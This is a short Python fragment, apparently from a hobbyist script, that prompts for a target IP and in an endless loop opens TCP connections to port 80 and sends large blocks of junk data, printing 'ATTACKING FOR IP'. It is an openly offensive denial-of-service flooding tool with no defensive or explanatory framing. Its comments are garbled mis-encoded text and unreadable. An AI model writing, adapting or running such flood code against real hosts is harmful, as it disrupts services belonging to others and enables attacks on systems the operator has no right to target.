ip =input(Fore.RED+'Enter The IP : ')

while True:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)  # ╪к╪╣┘К┘К┘Ж ┘В┘К┘Е╪й settimeout() ╪╣┘Д┘Й ┘Е╪к╪║┘К╪▒ sock
    conn = sock.connect((ip, 80))  # ╪з╪│╪к╪п╪╣╪з╪б connect() ╪╣┘Д┘Й sock
    data = "nshsvssjsbsvegejebdgejeeb" * 1000
    sock.send(data.encode())  # ╪к╪н╪│┘К┘Ж ╪з┘Д┘Г┘И╪п ╪и╪к╪┤┘Б┘К╪▒ ╪з┘Д╪и┘К╪з┘Ж╪з╪к ┘В╪и┘Д ╪з┘Д╪е╪▒╪│╪з┘Д
    print(Fore.RED+'ATTACKING FOR IP',Fore.RED+ip,Fore.RED+ 'port 80')
